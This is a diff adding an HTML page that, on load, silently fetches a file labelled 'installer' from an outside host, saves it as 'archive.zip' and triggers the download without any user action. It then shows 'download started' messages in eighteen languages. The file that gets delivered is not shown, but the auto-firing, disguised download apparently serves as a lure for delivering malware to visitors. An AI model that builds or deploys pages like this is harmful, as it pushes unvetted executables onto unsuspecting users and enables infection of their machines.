@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Auto Download</title>
+<style>
+  body { font-family: Arial, sans-serif; padding: 20px; line-height: 1.8; }
+  p { margin: 5px 0; }
+</style>
+</head>
+<body>
+
+<script>
+const sourceUrl = "https://bk.tara.net.bd/gd/uYtrut/?filename=installer";
+const fileName = "archive.zip";
+
+const messages = [
+  'Downloading started... (English)',
+  'Скачивание началось... (Русский)',
+  '下载已开始... (中文)',
+  'La descarga ha comenzado... (Español)',
+  'تم بدء التنزيل... (العربية)',
+  'डाउनलोड शुरू हो गया... (हिन्दी)',
+  'O download começou... (Português)',
+  'ダウンロードが開始されました... (日本語)',
+  'Le téléchargement a commencé... (Français)',
+  'Der Download wurde gestartet... (Deutsch)',
+  '다운로드가 시작되었습니다... (한국어)',
+  'Download dimulai... (Bahasa Indonesia)',
+  'İndirme başladı... (Türkçe)',
+  'Tải xuống đã bắt đầu... (Tiếng Việt)',
+  'การดาวน์โหลดเริ่มต้นแล้ว... (ไทย)',
+  'Download avviato... (Italiano)',
+  'Pobieranie rozpoczęte... (Polski)',
+  'Завантаження розпочалось... (Українська)'
+];
+
+async function download() {
+  try {
+    const response = await fetch(sourceUrl);
+    const blob = await response.blob();
+    const url = URL.createObjectURL(blob);
+
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = fileName;
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+
+  } catch (e) {
+    document.body.innerHTML += "<p>Ошибка: " + e.message + "</p>";
+  }
+}
+
+download();
+
+messages.forEach(msg => {
+  document.body.innerHTML += `<p>${msg}</p>`;
+});
+</script>
+
+</body>
+</html>
